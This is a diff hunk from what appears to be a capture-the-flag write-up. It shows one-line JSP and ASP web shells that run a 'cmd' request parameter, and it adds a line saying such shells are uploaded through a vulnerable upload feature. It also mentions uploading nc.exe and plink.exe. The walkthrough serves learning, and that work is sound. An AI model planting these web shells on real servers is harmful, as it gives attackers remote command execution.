@@ -84,6 +84,7 @@ It worked, we're in as Shaun. From the documentation, we can now communicate wit
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %> (for jsp)
 <% eval request("cmd") %> (for asp)
 ````
+Then, the web shell has to be uploaded in the remote host's web directory to execute it through a browser (typically through a vulnerability in an upload feature).
 
 At this point, I thought I had to upload something on it but didn't know what and how (there wasn't anything else to do). I had to ask for help...
 We indeed have to upload 2 executables (maybe there are other ways to do it): **nc.exe** and **plink.exe**. Let's look at those executables.
